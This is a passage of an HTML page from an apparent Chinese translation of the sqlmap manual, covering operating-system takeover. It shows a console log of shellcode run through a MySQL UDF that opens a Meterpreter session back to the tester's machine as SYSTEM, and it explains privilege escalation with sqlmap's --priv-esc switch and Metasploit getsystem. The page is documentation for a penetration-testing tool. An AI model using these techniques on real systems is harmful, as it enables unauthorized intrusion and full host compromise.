+[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF &apos;sys_b
+ineval&apos;, please wait..
+[*] Sending stage (749056 bytes) to 192.168.136.129
+[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) a
+t Mon Apr 11 hh:mm:52 +0100 2011
+
+meterpreter &gt; Loading extension espia...success.
+meterpreter &gt; Loading extension incognito...success.
+meterpreter &gt; [-] The &apos;priv&apos; extension has already been loaded.
+meterpreter &gt; Loading extension sniffer...success.
+meterpreter &gt; System Language : en_US
+OS              : Windows .NET Server (Build 3790, Service Pack 2).
+Computer        : W2K3R2
+Architecture    : x86
+Meterpreter     : x86/win32
+meterpreter &gt; Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; ipconfig
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+
+Intel(R) PRO/1000 MT Network Connection
+Hardware MAC: 00:0c:29:fc:79:39
+IP Address  : 192.168.136.129
+Netmask     : 255.255.255.0
+
+
+meterpreter &gt; exit
+
+[*] Meterpreter session 1 closed.  Reason: User exit
+</code></pre>
+<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MySQL &#x5728; Windows &#x4E0A;&#x4EE5; <code>SYSTEM</code> &#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#xFF0C;&#x7136;&#x800C; PostgreSQL &#x5728; Windows &#x548C; Linux &#x4E0A;&#x5747;&#x4EE5;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237; <code>postgres</code> &#x8FD0;&#x884C;&#x3002;Microsoft SQL Server 2000 &#x9ED8;&#x8BA4;&#x4EE5; <code>SYSTEM</code> &#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#xFF0C;&#x800C; Microsoft SQL 2005 &#x548C; 2008 &#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x4EE5; <code>NETWORK SERVICE</code> &#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x4EE5; <code>LOCAL SERVICE</code> &#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#x3002;</p>
+<p>&#x4F7F;&#x7528; sqlmap &#x7684; <code>--priv-esc</code> &#x5F00;&#x5173;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; Metasploit <code>getsystem</code> &#x547D;&#x4EE4;&#x8FDB;&#x884C;<strong>&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x7A0B;&#x7528;&#x6237;&#x63D0;&#x6743;</strong>&#xFF0C;&#x8BE5;&#x547D;&#x4EE4;&#x4F7F;&#x7528;&#x4E86;&#x5305;&#x62EC; <a href="http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html" target="_blank">kitrap0d</a> &#x5728;&#x5185;&#x7684;&#x5404;&#x79CD;&#x6280;&#x672F;&#xFF08;<a href="http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx" target="_blank">MS10-015</a>&#xFF09;&#x3002;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="File-system-access.html" class="navigation navigation-prev " aria-label="Previous page: 访问文件系统">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="Windows-registry-access.html" class="navigation navigation-next " aria-label="Next page: 访问 Windows 注册表">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"接管操作系统","level":"2.8.13","depth":2,"next":{"title":"访问 Windows 注册表","level":"2.8.14","depth":2,"path":"Users-manual/Usage/Windows-registry-access.md","ref":"Users-manual/Usage/Windows-registry-access.md","articles":[]},"previous":{"title":"访问文件系统","level":"2.8.12","depth":2,"path":"Users-manual/Usage/File-system-access.md","ref":"Users-manual/Usage/File-system-access.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"path":{"toc":"SUMMARY.md"},"theme":"default","name":"sqlmap-wiki-zhcn","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"introduction":"最新的 sqlmap wiki 中文版。","gitbook":"*"},"file":{"path":"Users-manual/Usage/Operating-system-takeover.md","mtime":"2023-11-12T07:55:51.437Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-11-12T07:56:17.655Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
